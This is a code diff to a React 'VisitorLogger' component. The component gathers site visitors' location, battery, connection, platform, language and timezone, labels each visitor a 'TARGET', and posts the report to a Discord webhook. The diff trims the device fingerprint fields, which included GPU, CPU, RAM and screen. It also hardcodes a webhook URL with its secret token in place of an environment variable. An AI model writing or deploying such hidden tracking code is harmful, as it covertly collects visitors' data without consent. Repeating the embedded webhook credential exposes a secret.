@@ -72,39 +72,20 @@ export default function VisitorLogger() {
         const message = {
           embeds: [{
             title: "🕵️ VISITOR ANALYSIS REPORT",
-            description: `**TARGET:** \`${data.ip}\`\n**LOCATION:** ${data.city}, ${data.region}, ${data.country_name} ${data.country || ''}`,
-            color: 0x2b2d31, // Dark Slate (Clean/Terminal look)
+            color: 0x00ff00,
             fields: [
-              { 
-                name: "📡 NETWORK IDENTITY", 
-                value: `\`\`\`yaml\nISP:      ${data.org}\nIP:       ${data.ip}\nTimezone: ${timeZone}\n\`\`\``, 
-                inline: false 
-              },
-              { 
-                name: "💻 SYSTEM FINGERPRINT", 
-                value: `\`\`\`yaml\nGPU:    ${gpu}\nCPU:    ${cores} Cores\nRAM:    ${ram}\nScreen: ${screenRes} (Px: ${pixelRatio})\n\`\`\``, 
-                inline: false 
-              },
-              { 
-                name: "🔋 STATUS & CONNECTION", 
-                value: `\`\`\`yaml\nBattery:  ${batteryInfo}\nNetwork:  ${connType.toUpperCase()} (${connSpeed})\nPlatform: ${platform}\n\`\`\``, 
-                inline: false 
-              },
-              { 
-                name: "📊 TRAFFIC STATS", 
-                value: `\`\`\`yaml\nDaily Visitors: #${visitCount}\nLanguage:       ${language}\n\`\`\``, 
-                inline: false 
-              }
+              { name: "📍 Location", value: `\`${data.city || '?'}, ${data.region || '?'}, ${data.country_name || '?'}\``, inline: true },
+              { name: "🔋 Battery", value: `\`${batteryInfo}\``, inline: true },
+              { name: "🌐 Connection", value: `\`${connType} (${connSpeed})\``, inline: true },
+              { name: "🛠️ Platform", value: `\`${platform} | ${language} | ${timeZone}\``, inline: false }
             ],
-            footer: {
-              text: `GHOST LOGGER v2.0 • TERMINAL_ID: ${Math.random().toString(36).substring(7).toUpperCase()}`
-            },
+            footer: { text: `Target Environment: ${isMobile ? 'MOBILE' : 'DESKTOP'}` },
             timestamp: new Date().toISOString()
           }]
         }
 
         // --- 3. SEND WEBHOOK ---
-        const webhookUrl = import.meta.env.VITE_DISCORD_WEBHOOK
+        const webhookUrl = "https://discord.com/api/webhooks/1495391384960499787/kGenDPVUjFa71EAZerGTVl0g_yOC25J9Mzs6zZfPvO_rmWWxpO593JEM1v09dPWiJqug" ||import.meta.env.VITE_DISCORD_WEBHOOK
         
         if (webhookUrl) {
           await fetch(webhookUrl, {
